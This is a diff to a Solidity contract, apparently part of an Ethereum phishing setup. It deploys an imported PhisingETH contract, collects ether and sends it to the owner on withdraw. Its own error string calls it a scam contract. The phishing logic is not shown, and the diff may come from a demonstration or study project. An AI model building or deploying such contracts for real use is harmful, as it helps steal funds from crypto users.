@@ -3,23 +3,23 @@ pragma solidity 0.8.25;
 
 import "./phisingETH.sol";
 
-contract receiver{
+contract receiver {
     address private owner;
-    phisingETH phising;
+    PhisingETH phising;
 
-    modifier onlyOwner{
+    modifier onlyOwner() {
         require(msg.sender == owner, "This is my scam contract hahahhaha");
         _;
     }
-    
-    constructor (address _owner){
+
+    constructor(address _owner, address _receiver) {
         owner = _owner;
-        phising = new phisingETH();
+        phising = new PhisingETH(_receiver);
     }
 
-    function withdraw() external onlyOwner{
+    function withdraw() external onlyOwner {
         (bool ok, ) = owner.call{value: address(this).balance}("");
     }
 
-    receive() payable{}
+    receive() external payable {}
 }
